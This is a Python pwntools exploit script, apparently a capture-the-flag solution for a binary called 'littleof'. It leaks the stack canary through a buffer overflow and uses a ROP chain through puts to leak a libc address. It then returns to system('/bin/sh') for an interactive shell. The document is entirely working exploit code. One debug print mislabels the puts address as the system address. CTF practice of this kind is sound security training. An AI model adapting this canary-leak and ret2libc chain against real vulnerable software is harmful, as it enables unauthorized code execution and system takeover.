from pwn import *
from LibcSearcher import *


context(log_level="info")
io = process("./littleof")
#io = remote("node4.anna.nssctf.cn", 21178)
elf = ELF("./littleof")
#libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")
libc = ELF("/usr/lib/libc.so.6")

context.gdb_binary = "/bin/pwndbg"

# gdb.attach(io)
payload = b"a" * (0x50 - 0x8 - 4) + b"bbbb"
ret_address = 0x040059E
pop_rdi_address = 0x400863
puts_got_addr = elf.got["puts"]
puts_plt_addr = elf.plt["puts"]
main_addr = 0x400789

io.recvuntil(b"overflow?")
io.sendline(payload)
io.recvuntil(b"bbbb\n")
canary = u64(io.recv(7).rjust(8, b"\x00"))
print(f"canary: {hex(canary)}")
io.recvuntil(b"harder!")

payload = (
    b"a" * (0x50 - 0x8)
    + p64(canary)
    + b"a" * 8
    + p64(pop_rdi_address)
    + p64(puts_got_addr)
    + p64(puts_plt_addr)
    + p64(main_addr)
)

io.sendline(payload)
# 跳回 main 函数

io.recvuntil(b"I hope you win\n")
puts_addr = u64(io.recv(6).ljust(8, b"\x00"))
libc_base_addr = puts_addr - libc.sym["puts"]
print(f"puts address = {hex(puts_addr)}")
print(f"libc base address = {hex(libc_base_addr)}")

system_addr = libc_base_addr + libc.sym["system"]
binsh_addr = libc_base_addr + next(libc.search(b"/bin/sh\x00"))
print(f"system address = {hex(puts_addr)}")
print(f"/bin/sh address = {hex(binsh_addr)}")

io.recvuntil(b"overflow?")
io.sendline(b"")

payload = (
    b"a" * (0x50 - 0x8)
    + p64(canary)
    + b"a" * 8
    + p64(ret_address)
    + p64(pop_rdi_address)
    + p64(binsh_addr)
    + p64(system_addr)
)

io.recvuntil(b"harder!")
io.sendline(payload)

io.interactive()
